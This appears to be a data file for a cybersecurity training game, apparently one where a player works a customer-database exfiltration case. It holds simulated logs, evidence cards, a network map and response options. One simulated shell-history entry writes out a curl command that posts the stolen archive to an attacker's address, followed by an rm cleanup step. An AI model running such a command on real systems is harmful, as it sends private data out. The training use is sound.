      ],
    },
    campaignReveal: {
      title: 'CAMPAIGN RECONSTRUCTION',
      intro: 'Four cases. One adversary. Reviewed in order, the pattern is unmistakable — this was a single, patient campaign against CyberCorp, and you worked every stage of it:',
      chain: [
        { op: 'OPS-2026-001', stage: 'THE CONTRACTOR', line: 'A contractor account quietly staged sensitive files inside a release package.' },
        { op: 'OPS-2026-002', stage: 'THE DEVICE', line: 'An unauthorized device appeared on the internal network — a quiet way in.' },
        { op: 'OPS-2026-003', stage: 'THE ACCOUNT', line: 'A Finance account was taken over, handing the adversary trusted access.' },
        { op: 'OPS-2026-004', stage: 'THE DATA TRANSFER', line: 'That trusted access bundled the customer database and shipped it out.' },
      ],
      closer: 'Every case you closed was a stage of the same operation. The company remembered each one — and so did you.',
    },
    performanceReview: true,
    evidenceEmpty: 'No evidence yet. Work the timeline in the terminal — read the logs in order (login, file access, archive, transfer) and each command can surface a new finding.',
    risks: [
      { id: 'risk_offhours_login',   label: 'A Finance account logged in outside normal hours',           triggeredBy: ['ev_login'] },
      { id: 'risk_contractor_src',   label: 'The session traces to the previously flagged contractor',     triggeredBy: ['ev_contractor_src'] },
      { id: 'risk_bulk_read',        label: 'The customer database was read in bulk',                       triggeredBy: ['ev_customer_db'] },
      { id: 'risk_archive',          label: 'The customer records were bundled into one archive',           triggeredBy: ['ev_archive'] },
      { id: 'risk_external_transfer',label: 'The archive was transferred to an outside address',            triggeredBy: ['ev_external_dest', 'ev_transfer'] },
      { id: 'risk_pii_exposure',     label: 'The lost data is regulated customer PII',                      triggeredBy: ['ev_legal'] },
    ],
    identify: {
      head: 'YOUR DETERMINATION',
      prompt: 'What is the root cause of this data exfiltration?',
      reviewLabel: 'Root cause',
      note: 'Determination recorded — this is the root cause your incident report will name.',
      correctId: 'rc_contractor',
      options: [
        { id: 'rc_contractor', label: 'A compromised Finance account operated by the recurring contractor (J. Demir)' },
        { id: 'rc_external',   label: 'An unrelated external attacker with no prior history' },
        { id: 'rc_insider',    label: 'A current employee deliberately stealing data on their own' },
        { id: 'rc_malware',    label: 'Automated malware exfiltrating data with no human operator' },
      ],
    },

    // Reactive exfiltration map — review-only, same engine as M2/M3. The SOC
    // monitoring/DLP system is the only pre-known node; the account, endpoint,
    // customer database, archive, external destination and contractor each
    // appear ONLY once their proving evidence is surfaced.
    map: {
      cap: 'DATA EXFILTRATION · EGRESS REVIEW — LATAM REGION',
      hint: 'Red marks the stolen data'+"'"+'s path out and the external destination. Select any node or connection for analyst intel.',
      nodes: {
        siem: {
          x: 50, y: 10, glyph: '🛰️', label: 'soc.cybercorp', sub: 'monitoring & DLP', seed: true, status: 'identified',
          intel: {
            what: 'The SOC monitoring and data-loss-prevention system that raised the large-egress alert behind this case.',
            technique: 'It is the system under review — the DLP alert and the egress logs all originate here.',
            why: 'It watches for sensitive data leaving the network, so every transfer is reviewed against it.' },
        },
        account: {
          x: 50, y: 38, glyph: '👤', label: 'a.okafor', sub: 'Finance account',
          revealBy: 'ev_login', statusBy: { ev_login: 'target', ev_contractor_src: 'suspicious' },
          intel: {
            what: 'The Finance account whose off-hours login began this incident.',
            technique: 'cat login_history.log — an off-hours session on this account starts the timeline.',
            why: 'A trusted Finance account is exactly what an attacker needs to reach the customer database quietly.' },
        },
        endpoint: {
          x: 18, y: 30, glyph: '💻', label: 'WS-FIN-04', sub: 'workstation',
          revealBy: 'ev_endpoint', statusBy: { ev_endpoint: 'suspicious' },
          intel: {
            what: 'The workstation where the archive was built and the upload was launched.',
            technique: 'cat endpoint_activity.log — the zip and the outbound upload both run from this host.',
            why: 'It is the staging point — where the theft was actually carried out.' },
        },
        custdb: {
          x: 82, y: 30, glyph: '🗄️', label: 'customer_database.csv', sub: '240,000 records',
          revealBy: 'ev_file_access', statusBy: { ev_file_access: 'target', ev_customer_db: 'target' },
          intel: {
            what: 'The customer database — 240,000 records of regulated personal data — read in bulk.',
            technique: 'cat file_access.log; grep customer_database file_access.log — a full bulk read of this file.',
            why: 'It is the crown-jewel data; reading all of it at once is the prelude to theft.' },
        },
        archive: {
          x: 68, y: 64, glyph: '📦', label: 'customer_data.zip', sub: '1.2 GB archive',
          revealBy: 'ev_archive', statusBy: { ev_archive: 'target' },
          intel: {
            what: 'The single 1.2 GB archive the customer records were bundled into for transfer.',
            technique: 'cat archive_creation.log — customer_data.zip created from the database minutes after the bulk read.',
            why: 'Packing everything into one file is how an attacker moves a whole database out in one quiet upload.' },
        },
        exfil: {
          x: 86, y: 80, glyph: '🌐', label: '198.51.100.23', sub: 'external host (LATAM)',
          revealBy: 'ev_external_dest', status: 'suspicious', statusBy: { ev_external_dest: 'suspicious', ev_transfer: 'suspicious' }, identifyAs: 'rc_external',
          intel: {
            what: 'The external, attacker-controlled host the archive was uploaded to — outside CyberCorp entirely.',
            technique: 'cat transfer.log; grep external network_activity.log — the upload destination address.',
            why: 'Once the data reaches this address it is gone — this is the moment the breach becomes real.' },
        },
        contractor: {
          x: 30, y: 72, glyph: '👷', label: 'ext-contractor-07', sub: 'J. Demir',
          revealBy: 'ev_contractor_src', statusBy: { ev_contractor_src: 'suspicious' }, identifyAs: 'rc_contractor',
          intel: {
            what: 'The recurring vendor (J. Demir / ext-contractor-07) whose identity the exfil session traces back to.',
            technique: 'grep contractor01 login_history.log — the session maps to this contractor from your prior cases.',
            why: 'The same actor escalating from earlier cases to outright data theft turns this into a campaign.' },
        },
      },
      links: [
        { a: 'account', b: 'siem', revealBy: 'ev_login',
          intel: {
            what: 'This account'+"'"+'s activity is logged and watched by the SOC monitoring system.',
            technique: 'cat login_history.log — the account'+"'"+'s sessions are recorded here.',
            why: 'It is the normal monitored path; the theft shows up as abnormal events along it.' } },
        { a: 'account', b: 'custdb', revealBy: 'ev_file_access', danger: true,
          intel: {
            what: 'The compromised account opened and read the entire customer database.',
            technique: 'grep customer_database file_access.log — a bulk read of every record.',
            why: 'A single account reading the whole database at once is the staging step before theft.' } },
        { a: 'custdb', b: 'archive', revealBy: 'ev_archive', danger: true,
          intel: {
            what: 'The database records were bundled into one compressed archive.',
            technique: 'cat archive_creation.log — customer_data.zip built from the database.',
            why: 'Archiving everything into one file is how a whole database is moved out quietly.' } },
        { a: 'archive', b: 'exfil', revealBy: 'ev_external_dest', danger: true,
          intel: {
            what: 'The archive was uploaded from the network to an external, attacker-controlled host.',
            technique: 'cat transfer.log; grep external network_activity.log — the outbound upload.',
            why: 'This is the exfiltration itself — the data physically leaving the company.' } },
        { a: 'endpoint', b: 'archive', revealBy: 'ev_endpoint',
          intel: {
            what: 'The archive was created and uploaded from this workstation.',
            technique: 'cat endpoint_activity.log; history — the zip and upload commands ran here.',
            why: 'It pins the theft to a specific machine — where the operator was working.' } },
        { a: 'account', b: 'contractor', revealBy: 'ev_contractor_src', danger: true,
          intel: {
            what: 'The session driving the account traces back to the recurring contractor from your earlier cases.',
            technique: 'grep contractor01 login_history.log — the source maps to ext-contractor-07 (J. Demir).',
            why: 'It ties this theft to the same actor — escalation, not a new stranger.' } },
      ],
    },

    intro: [
      { t: 'CyberCorp SOC // Career Operating Center — Incident Response', c: 'head' },
      { t: 'DLP raised a CRITICAL alert: a large archive of customer data left the network overnight.', c: 'dim' },
      { t: 'Reconstruct the timeline, name the root cause, and recommend the response.', c: 'dim' },
      { t: 'Type  cat login_history.log  to start, then  help  for the full command list.', c: 'dim' },
    ],
    brief: {
      situation:
        'Overnight, data-loss-prevention flagged a large outbound transfer: a 1.2 GB ' +
        'archive of the customer database — 240,000 records of regulated personal data — ' +
        'uploaded to an external host. Work the logs in order to reconstruct exactly how ' +
        'the data left (login, file access, archive creation, transfer), determine the ' +
        'root cause, and recommend how CyberCorp should respond to a confirmed breach.',
      objectives: [
        'Reconstruct the exfiltration timeline: login -> file access -> archive -> transfer',
        'Confirm what was taken and where it was sent',
        'Assess the business and regulatory impact of the loss',
        'Name the root cause — then recommend the incident response',
      ],
      managerNote:
        '"This is the one we feared. The contractor thread you have been pulling since your ' +
        'first case may have just become a real breach. Build the timeline cleanly, tell me ' +
        'the root cause, and recommend the response — you do not pull the company offline ' +
        'yourself. The board is already asking questions. — Sarah Reyes, SOC Lead"',
    },

    commands: [
      {
        id: 'cat_login_history',
        match: ['cat login_history.log', 'cat login_history', 'less login_history.log'],
        help: 'read the account login history',
        core: true,
        output: [
          { t: 'login_history.log — last 24h (summary)', c: 'head' },
          '  02:47  a.okafor   LOGIN SUCCESS   host WS-FIN-04   (off-hours)',
          '  02:47  note: no failed attempts — valid credentials used',
          '  # a.okafor normally signs in 08:00–18:00 only',
        ],
        reveals: ['ev_login'],
        observation: 'A Finance account signed in cleanly at 02:47 — off-hours, no failed attempts, valid credentials.',
        question: 'A valid login at 3am with no failures — stolen credentials, or the real owner working late?',
        next: 'check whose credentials those are — type  grep contractor01 login_history.log',
      },
      {
        id: 'grep_contractor_login',
        match: ['grep contractor01 login_history.log', 'grep contractor01', 'grep contractor login_history.log'],
        help: 'cross-reference the session source',
        core: true,
        output: [
          { t: 'grep contractor01 login_history.log', c: 'head' },
          '  02:47  a.okafor  src maps to contractor01 / ext-contractor-07 (prior-case identity)',
          '  # same source identity flagged in your earlier assignments',
        ],
        reveals: ['ev_contractor_src'],
        observation: 'The off-hours session maps to contractor01 — the recurring contractor identity (J. Demir) from your earlier cases.',
        question: 'The same actor from your past cases is back inside a Finance account — what are they after now?',
        next: 'see what the account opened — type  cat file_access.log',
      },
      {
        id: 'cat_file_access',
        match: ['cat file_access.log', 'cat file_access', 'less file_access.log'],
        help: 'read what files the account opened',
        core: true,
        output: [
          { t: 'file_access.log — a.okafor (after 02:47)', c: 'head' },
          '  02:51  opened   /finance/customer_database.csv',
          '  02:51  read     FULL TABLE (no filter, all rows)',
        ],
        reveals: ['ev_file_access'],
        observation: 'Minutes after logging in, the account opened the customer database and read the whole thing.',
        question: 'Why would anyone open the entire customer database at once in the middle of the night?',
        next: 'confirm the scale of that read — type  grep customer_database file_access.log',
      },
      {
        id: 'grep_customer_db',
        match: ['grep customer_database file_access.log', 'grep customer_database', 'grep customer_database file_access'],
        help: 'focus on the customer-database access',
        core: true,
        output: [
          { t: 'grep customer_database file_access.log', c: 'head' },
          '  02:51  customer_database.csv  BULK READ  240,000 rows',
          '  # every customer record, in one pass',
        ],
        reveals: ['ev_customer_db'],
        observation: 'All 240,000 customer records were read in a single bulk pass — not a normal lookup.',
        question: 'A full-table read of every customer — does that look like daily work, or like staging a theft?',
        next: 'see what happened to those records next — type  cat archive_creation.log',
      },
      {
        id: 'cat_archive_creation',
        match: ['cat archive_creation.log', 'cat archive_creation', 'less archive_creation.log'],
        help: 'read the archive-creation log',
        core: true,
        output: [
          { t: 'archive_creation.log — WS-FIN-04', c: 'head' },
          '  02:58  created  customer_data.zip  (1.2 GB)',
          '  02:58  source   customer_database.csv (240,000 rows)',
        ],
        reveals: ['ev_archive'],
        observation: 'The records were bundled into a single 1.2 GB archive — customer_data.zip — within minutes of the read.',
        question: 'Packing the whole database into one file — what is the only reason to do that?',
        next: 'find out where that archive went — type  cat transfer.log',
      },
      {
        id: 'cat_transfer',
        match: ['cat transfer.log', 'cat transfer', 'less transfer.log'],
        help: 'read the data-transfer log',
        core: true,
        output: [
          { t: 'transfer.log — WS-FIN-04 (after 02:58)', c: 'head' },
          '  03:04  UPLOAD  customer_data.zip  -> 198.51.100.23  (external)',
          '  03:09  UPLOAD COMPLETE  1.2 GB transferred',
        ],
        reveals: ['ev_transfer'],
        observation: 'The archive was uploaded to an outside address and the transfer completed — 1.2 GB gone.',
        question: 'The data has left the building — at what point does this stop being a risk and become a breach?',
        next: 'confirm the destination is outside CyberCorp — type  grep external network_activity.log',
      },
      {
        id: 'grep_archive_transfer',
        match: ['grep archive transfer.log', 'grep archive transfer', 'grep archive'],
        help: 'isolate the archive upload entry',
        output: [
          'transfer.log:  03:04  UPLOAD  customer_data.zip (1.2 GB)  -> 198.51.100.23',
          'transfer.log:  protocol: HTTPS POST  status: COMPLETE',
        ],
        observation: 'The upload was a single HTTPS POST of the full archive — quiet, encrypted, and complete.',
        question: 'An encrypted upload hides the contents — so what evidence is left to prove what was taken?',
        next: 'check the destination against the network log — type  grep external network_activity.log',
      },
      {
        id: 'cat_network_activity',
        match: ['cat network_activity.log', 'cat network_activity', 'less network_activity.log'],
        help: 'read the network activity log',
        output: [
          { t: 'network_activity.log — WS-FIN-04 (03:00–03:10)', c: 'head' },
          '  03:04  outbound  1.2 GB  dst 198.51.100.23  port 443',
          '  03:04  note: destination is outside all CyberCorp ranges',
        ],
        observation: 'A single large outbound flow at 03:04 leaves the network for an external destination.',
        question: 'One big outbound transfer to an unknown address — is that ever normal overnight traffic?',
        next: 'name the destination as external — type  grep external network_activity.log',
      },
      {
        id: 'grep_external_network',
        match: ['grep external network_activity.log', 'grep external', 'grep external network_activity'],
        help: 'show only external destinations',
        core: true,
        output: [
          { t: 'grep external network_activity.log', c: 'head' },
          '  03:04  EXTERNAL  dst 198.51.100.23  geo: LATAM region  owner: unknown host',
          '  # not a CyberCorp system, not a known partner',
        ],
        reveals: ['ev_external_dest'],
        observation: 'The destination is an unknown host outside the company, in the LATAM region — attacker-controlled.',
        question: 'The data is now on a stranger'+"'"+'s server — what does CyberCorp owe the 240,000 affected customers?',
        next: 'pin the theft to a machine — type  cat endpoint_activity.log',
      },
      {
        id: 'cat_endpoint_activity',
        match: ['cat endpoint_activity.log', 'cat endpoint_activity', 'less endpoint_activity.log'],
        help: 'read the endpoint activity log',
        output: [
          { t: 'endpoint_activity.log — WS-FIN-04', c: 'head' },
          '  02:58  process  zip  -> customer_data.zip',
          '  03:04  process  upload client -> 198.51.100.23',
        ],
        reveals: ['ev_endpoint'],
        observation: 'Both the archiving and the upload ran from one workstation, WS-FIN-04 — the staging machine.',
        question: 'You now have the machine the theft ran on — what does that let the IR team do next?',
        next: 'see the exact commands that ran — type  history',
      },
      {
        id: 'history',
        match: ['history', 'cat .bash_history', 'cat bash_history'],
        help: 'show the shell command history on the endpoint',
        output: [
          { t: 'history — WS-FIN-04 (a.okafor session)', c: 'head' },
          '  zip -r customer_data.zip customer_database.csv',
          '  curl -X POST --data-binary @customer_data.zip https://198.51.100.23/u',
          '  rm customer_data.zip   # cleanup attempt',
        ],
        reveals: ['ev_history'],
        observation: 'The shell history shows the archive built, uploaded, then deleted — a deliberate steal-and-clean sequence.',
        question: 'They tried to delete the evidence afterward — what does that tell you about intent?',
        next: 'measure what was lost — type  stat customer_database.csv',
      },
      {
        id: 'stat_customer_db',
        match: ['stat customer_database.csv', 'stat customer_database', 'stat customer_data'],
        help: 'show the size of the source database',
        output: [
          { t: 'stat customer_database.csv', c: 'head' },
          '  size: 1.2 GB    rows: 240,000    contains: names, emails, addresses, payment refs',
          '  classification: RESTRICTED (regulated PII)',
        ],
        reveals: ['ev_volume'],
        observation: 'The source file is 1.2 GB of restricted, regulated PII for 240,000 people — matching the archive that left.',
        question: 'Restricted PII for a quarter-million people is now gone — how big is this, really?',
        next: 'check whether the system already called it exfiltration — type  cat system_alerts.log',
      },
      {
        id: 'grep_customer_records',
        match: ['grep customer_records transfer.log', 'grep customer_records', 'grep customer_records transfer'],
        help: 'confirm the record count in the transfer',
        output: [
          'transfer.log:  payload manifest: customer_records=240,000',
          'transfer.log:  matches customer_database.csv row count exactly',
        ],
        observation: 'The transfer manifest lists 240,000 customer_records — the entire database left, not a sample.',
        question: 'The count matches the whole database — does a partial-loss story hold up anymore?',
        next: 'see the system'+"'"+'s own verdict — type  cat system_alerts.log',
      },
      {
        id: 'cat_system_alerts',
        match: ['cat system_alerts.log', 'cat system_alerts', 'less system_alerts.log'],
        help: 'read the DLP / system alerts',
        output: [
          { t: 'system_alerts.log — DLP', c: 'head' },
          '  03:05  CRITICAL  DLP: large outbound transfer of RESTRICTED data',
          '  03:05  classification: confirmed data exfiltration',
        ],
        reveals: ['ev_dlp'],
        observation: 'The DLP system independently classified this as a confirmed data-exfiltration event.',
        question: 'The monitoring already confirms exfiltration — are you ready to name the root cause and respond?',
        next: 'read the response runbook — type  cat incident_notes.txt',
      },
      {
        id: 'cat_incident_notes',
        match: ['cat incident_notes.txt', 'cat incident_notes', 'less incident_notes.txt'],
        help: 'read the incident-response runbook notes',
        output: [
          { t: 'incident_notes.txt — IR runbook', c: 'head' },
          '  Confirmed exfiltration of regulated PII requires: contain the channel,',
          '  escalate to IR, and recommend customer + regulator notification.',
        ],
        reveals: ['ev_incident_notes'],
        observation: 'The runbook is explicit: confirmed PII exfiltration means contain, escalate, and notify — not investigate quietly.',
        question: 'With the runbook in hand, what is the complete response — not just the first step?',
        next: 'check the regulatory exposure — type  cat legal_exposure_report.txt',
      },
      {
        id: 'cat_legal_exposure',
        match: ['cat legal_exposure_report.txt', 'cat legal_exposure_report', 'less legal_exposure_report.txt'],
        help: 'read the legal-exposure report',
        output: [
          { t: 'legal_exposure_report.txt — Legal', c: 'head' },
          '  240,000 customers'+"'"+' PII exposed -> breach-notification thresholds MET',
          '  regulatory penalties likely if notification is delayed',
        ],
        reveals: ['ev_legal'],
        observation: 'Legal confirms the loss crosses breach-notification thresholds — regulators and customers must be told.',
        question: 'Notification is now a legal duty, not a choice — how does that shape your recommendation?',
        next: 'read the compliance view — type  cat compliance_review.txt',
      },
      {
        id: 'cat_compliance_review',
        match: ['cat compliance_review.txt', 'cat compliance_review', 'less compliance_review.txt'],
        help: 'read the compliance review',
        output: [
          { t: 'compliance_review.txt — Compliance', c: 'head' },
          '  Restricted customer PII left the org -> reportable breach.',
          '  Required: documented timeline, root cause, and notification plan.',
        ],
        observation: 'Compliance needs a documented timeline, a named root cause, and a notification plan — exactly the report you are building.',
        question: 'You have the timeline and the root cause — what is left to make the response complete?',
        next: 'see the manager and board context — type  cat manager_briefing.txt',
      },
      {
        id: 'cat_manager_briefing',
        match: ['cat manager_briefing.txt', 'cat manager_briefing', 'less manager_briefing.txt'],
        help: 'read the manager briefing',
        output: [
          { t: 'manager_briefing.txt — S. Reyes', c: 'head' },
          '  Treat as the top priority. Build the timeline, name the root cause,',
          '  recommend containment + escalation. Do not act company-wide yourself.',
        ],
        reveals: ['ev_manager'],
        observation: 'Your SOC Lead confirms the priority and the scope of your authority: recommend, do not act company-wide.',
        question: 'Within your authority as an intern, what is the strongest response you can recommend?',
        next: 'read the board pressure for context — type  cat board_concerns.txt',
      },
      {
        id: 'cat_board_concerns',
        match: ['cat board_concerns.txt', 'cat board_concerns', 'less board_concerns.txt'],
        help: 'read the board concerns memo',
        output: [
          { t: 'board_concerns.txt — Executive', c: 'head' },
          '  Board wants: how it happened, what was lost, and how it is being contained.',
          '  A clear, evidence-backed incident report is expected today.',
        ],
        observation: 'The board wants a clear, evidence-backed account — the incident report is the deliverable that answers them.',
        question: 'You have everything the board is asking for — ready to submit the incident report?',
        next: 'when your timeline and determination are set, type  decide',
      },
    ],

    evidence: [
      {
        id: 'ev_login', label: 'A Finance account logged in off-hours with valid credentials.',
        qualityWeight: 3, source: 'login_history.log',
        layers: {
          beginner: {
            summary: 'A Finance account signed in at 2:47am with the correct password and no failed tries.',
            why: 'A clean login at an unusual hour can mean stolen credentials being used by someone else.',
            prompt: 'A valid 3am login with no failures — the real owner, or someone using their password?',
          },
          analyst: 'a.okafor SUCCESS at 02:47 from WS-FIN-04, off-hours, zero failures — valid-credential use outside baseline.',
          technical: 'login_history.log — 02:47 a.okafor LOGIN SUCCESS, no auth failures; off-hours vs 08:00–18:00 baseline.',
          terms: ['credentialCompromise'],
        },
      },
      {
        id: 'ev_contractor_src', label: 'The session traces to the recurring contractor (J. Demir).',
        qualityWeight: 3, source: 'grep contractor01 login_history.log',
        layers: {
          beginner: {
            summary: 'The login maps to the same contractor identity (contractor01 / J. Demir) from your earlier cases.',
            why: 'A familiar flagged actor reappearing inside a Finance account points to the same person escalating.',
            prompt: 'The actor from your past cases is back — opportunism, or a planned campaign?',
          },
          analyst: 'Session source maps to contractor01 / ext-contractor-07 (J. Demir) — prior-case identity reused for this access.',
          technical: 'grep contractor01 login_history.log — src identity ↔ ext-contractor-07; same actor as earlier assignments.',
          terms: ['credentialCompromise'],
        },
      },
      {
        id: 'ev_file_access', label: 'The account opened the customer database and read the whole table.',
        qualityWeight: 3, source: 'file_access.log',
        layers: {
          beginner: {
            summary: 'Minutes after logging in, the account opened the customer database and read every row.',
            why: 'Reading the entire database at once is not normal work — it is how a theft is staged.',
            prompt: 'Why open the whole customer database at 3am instead of one record?',
          },
          analyst: 'Post-login (02:51) full-table read of /finance/customer_database.csv — no filter, all rows.',
          technical: 'file_access.log — 02:51 FULL TABLE read of customer_database.csv under the compromised account.',
          terms: ['pii', 'restricted'],
        },
        reflection: {
          title: 'REVIEW THE SUSPICIOUS ACTIVITY',
          prompt: 'What concerns you about this activity? (Tick anything that stands out.)',
          concerns: [
            'A Finance account signed in at 3am',
            'The whole customer database was read at once',
            'The records were bundled into one archive',
            'The archive was uploaded to an outside address',
            'This looks like normal overnight maintenance',
            'I need more information before deciding',
          ],
          judgmentPrompt: 'Based on what you found, how would you judge this activity?',
          feedback: 'There is no single right answer — analysts reason from what they observe. The SEQUENCE (login → bulk read → archive → upload), the SCALE (240,000 records), and the DESTINATION (an outside host) together make the case for exfiltration.',
        },
      },
      {
        id: 'ev_customer_db', label: 'All 240,000 customer records were read in one bulk pass.',
        qualityWeight: 3, source: 'grep customer_database file_access.log',
        layers: {
          beginner: {
            summary: 'The log confirms every one of the 240,000 customer records was read in a single pass.',
            why: 'A full-database read in one go is the classic first step of stealing the data.',
            prompt: 'A complete read of every customer — daily work, or staging a theft?',
          },
          analyst: 'Bulk read: customer_database.csv, 240,000 rows in a single pass — data-staging signature.',
          technical: 'grep customer_database file_access.log — 240,000-row BULK READ, no query filter.',
          terms: ['pii'],
        },
      },
      {
        id: 'ev_archive', label: 'The records were bundled into a single 1.2 GB archive.',
        qualityWeight: 3, source: 'archive_creation.log',
        layers: {
          beginner: {
            summary: 'The records were packed into one 1.2 GB file — customer_data.zip — right after the read.',
            why: 'Packing everything into one archive is how attackers move a whole database out in one upload.',
            prompt: 'What is the only real reason to zip the entire customer database into one file at 3am?',
          },
          analyst: 'archive_creation.log — customer_data.zip (1.2 GB) built from customer_database.csv at 02:58.',
          technical: 'archive_creation.log — 02:58 zip of 240,000-row source → customer_data.zip (1.2 GB); exfil staging.',
          terms: ['archive', 'dataExfiltration'],
        },
      },
      {
        id: 'ev_transfer', label: 'The archive was uploaded to an external address.',
        qualityWeight: 3, source: 'transfer.log',
        layers: {
          beginner: {
            summary: 'The archive was uploaded to an outside address and the 1.2 GB transfer finished.',
            why: 'This is the actual theft — the data physically leaving the company network.',
            prompt: 'The data has left — when does a risk become a real breach?',
          },
          analyst: 'transfer.log — 03:04 UPLOAD customer_data.zip → 198.51.100.23 (external); 1.2 GB COMPLETE at 03:09.',
          technical: 'transfer.log — HTTPS POST of 1.2 GB archive to external dst 198.51.100.23; transfer COMPLETE.',
          terms: ['dataExfiltration'],
        },
      },
      {
        id: 'ev_external_dest', label: 'The destination is an unknown external host in the LATAM region.',
        qualityWeight: 3, source: 'grep external network_activity.log',
        layers: {
          beginner: {
            summary: 'The upload went to an unknown server outside the company, in the LATAM region.',
            why: 'Once data reaches an outside server you do not control, it cannot be recalled — the breach is real.',
            prompt: 'The data is on a stranger'+"'"+'s server now — what does CyberCorp owe the affected customers?',
          },
          analyst: 'Egress to 198.51.100.23 (LATAM geo), owner unknown — not a CyberCorp asset or known partner.',
          technical: 'grep external network_activity.log — dst 198.51.100.23 outside all corp ranges; attacker-controlled host.',
          terms: ['dataExfiltration', 'dlp'],
        },
      },
      {
        id: 'ev_endpoint', label: 'The archive was built and uploaded from one workstation (WS-FIN-04).',
        qualityWeight: 2, source: 'endpoint_activity.log',
        layers: {
          beginner: {
            summary: 'Both the zipping and the upload happened on a single workstation, WS-FIN-04.',
            why: 'Knowing the exact machine lets the response team isolate it and preserve the evidence.',
            prompt: 'You have the machine — what should the IR team do with it first?',
          },
          analyst: 'endpoint_activity.log — zip + upload processes both on WS-FIN-04; staging host identified.',
          technical: 'endpoint_activity.log — 02:58 zip, 03:04 upload client, both on WS-FIN-04; isolate + image for forensics.',
          terms: ['incidentResponse'],
        },
      },
      {
        id: 'ev_history', label: 'The shell history shows build-upload-delete — a deliberate steal-and-clean.',
        qualityWeight: 2, source: 'history',
        layers: {
          beginner: {
            summary: 'The commands run show the archive made, uploaded, then deleted to cover tracks.',
            why: 'Deleting the evidence afterward shows this was deliberate, not an accident.',
            prompt: 'They tried to delete the file afterward — what does that say about intent?',
          },
          analyst: 'Shell history: zip → curl POST to 198.51.100.23 → rm — exfil then anti-forensic cleanup.',
          technical: 'history — zip -r; curl --data-binary @archive → external; rm archive (evidence destruction attempt).',
          terms: ['dataExfiltration'],
        },
      },
      {
        id: 'ev_volume', label: 'The lost data is 1.2 GB of restricted PII for 240,000 people.',
        qualityWeight: 2, source: 'stat customer_database.csv',
        layers: {
          beginner: {
            summary: 'The stolen file holds names, emails, addresses and payment references for 240,000 customers.',
            why: 'This is regulated personal data — losing it harms real people and triggers legal duties.',
            prompt: 'Restricted PII for a quarter-million people is gone — how serious is this?',
          },
          analyst: 'customer_database.csv = 1.2 GB / 240,000 rows of RESTRICTED PII (names, emails, addresses, payment refs).',
          technical: 'stat customer_database.csv — 1.2 GB, 240,000 rows, classification RESTRICTED (regulated PII).',
          terms: ['pii', 'restricted'],
        },
      },
      {
        id: 'ev_dlp', label: 'DLP independently classified this as confirmed data exfiltration.',
        qualityWeight: 2, source: 'system_alerts.log', setFlag: 'dataExfiltrationConfirmed',
        layers: {
          beginner: {
            summary: 'The data-loss-prevention system already labeled this a confirmed data-exfiltration event.',
            why: 'Independent confirmation that the separate clues add up to one real breach.',
            prompt: 'The system already confirms exfiltration — are you ready to name the root cause and act?',
          },
          analyst: 'DLP CRITICAL alert at 03:05: large outbound transfer of RESTRICTED data → confirmed exfiltration.',
          technical: 'system_alerts.log — DLP classification: confirmed data exfiltration of restricted PII (large egress).',
          terms: ['dlp', 'dataExfiltration'],
        },
      },
      {
        id: 'ev_incident_notes', label: 'The IR runbook requires containing the channel, escalating, and recommending notification.',
        qualityWeight: 1, source: 'incident_notes.txt',
        layers: {
          beginner: {
            summary: 'The incident-response runbook spells out the required steps for a confirmed PII breach.',
            why: 'Following the runbook turns a confirmed breach into a complete, defensible response.',
            prompt: 'With the runbook in hand, what is the full response — not just the first step?',
          },
          analyst: 'IR runbook: confirmed PII exfiltration → contain the channel, escalate to IR, recommend customer + regulator notification.',
          technical: 'incident_notes.txt — IR runbook: contain egress channel, escalate to IR, recommend customer + regulator notification on confirmed PII loss.',
          terms: ['incidentResponse', 'breachNotification'],
        },
      },
      {
        id: 'ev_legal', label: 'The loss crosses breach-notification thresholds — regulators must be told.',
        qualityWeight: 2, source: 'legal_exposure_report.txt',
        layers: {
          beginner: {
            summary: 'Legal confirms the company must notify regulators and customers about this loss.',
            why: 'For regulated personal data, notification is a legal duty — delay means fines and harm.',
            prompt: 'Notification is now required by law — how does that change your recommendation?',
          },
          analyst: 'Legal: 240,000 PII records exposed → breach-notification thresholds met; penalty risk on delay.',
          technical: 'legal_exposure_report.txt — regulatory breach-notification thresholds MET; delayed notice → penalties.',
          terms: ['breachNotification', 'pii'],
        },
      },
      {
        id: 'ev_manager', label: 'Your SOC Lead confirms the priority and the limits of your authority.',
        qualityWeight: 1, source: 'manager_briefing.txt',
        layers: {
          beginner: {
            summary: 'Your manager confirms this is top priority and that you recommend — you do not act company-wide.',
            why: 'Knowing the scope of your authority keeps your recommendation realistic and actionable.',
            prompt: 'Within an intern'+"'"+'s authority, what is the strongest response you can recommend?',
          },
          analyst: 'Manager: top priority; build timeline + root cause; recommend containment/escalation, not unilateral company-wide action.',
          technical: 'manager_briefing.txt — scope of authority = recommend; company-wide actions routed via SOC Lead / IR.',
          terms: ['incidentResponse'],
        },
      },
    ],

    actions: [
      {
        id: 'recommend_disable_account',
        type: 'recommendation',
        label: 'Recommend Account Disablement',
        summary: 'Recommend disabling the compromised Finance account to cut off the operator.',
        outcomeSub: 'You recommended disabling the compromised account.',
        deltas: { securityPosture: 16, complianceExposure: -10, businessContinuity: -5, executiveTrust: 8, careerReputation: 9 },
        setFlags: ['exfilContained'],
        deniedNote: 'Leadership held off on disabling the account pending firmer confirmation of compromise.',
        consequence: {
          immediate: ['The compromised account is disabled; the operator loses their way back in.'],
          business: ['Cuts the attacker'+"'"+'s access, though the data already taken is still gone.'],
          future: ['Fast containment of the access path strengthens your standing on later incidents.'],
        },
      },
      {
        id: 'recommend_block_device',
        type: 'recommendation',
        label: 'Recommend Device Block',
        summary: 'Recommend isolating the staging workstation and blocking the external destination.',
        outcomeSub: 'You recommended isolating the endpoint and blocking the destination.',
        deltas: { securityPosture: 15, complianceExposure: -8, businessContinuity: -4, executiveTrust: 7, careerReputation: 8 },
        setFlags: ['exfilContained'],
        deniedNote: 'Leadership wanted the account contained first before isolating hardware.',
        consequence: {
          immediate: ['WS-FIN-04 is isolated and the external host is blocked at the firewall.'],
          business: ['Stops any further upload from that machine; the endpoint is preserved for forensics.'],
          future: ['Blocking the channel is recorded as decisive containment.'],
        },
      },
      {
        id: 'recommend_forensics',
        type: 'recommendation',
        label: 'Recommend Forensics Review',
        summary: 'Recommend a forensic image and review of the staging workstation.',
        outcomeSub: 'You recommended a forensic review of the endpoint.',
        deltas: { securityPosture: 10, complianceExposure: -6, executiveTrust: 8, careerReputation: 7, businessContinuity: -2 },
        setFlags: ['incidentResponseEscalated'],
        deniedNote: 'Leadership wanted containment locked in before committing forensic resources.',
        consequence: {
          immediate: ['A forensic image of WS-FIN-04 is taken to preserve the full evidence chain.'],
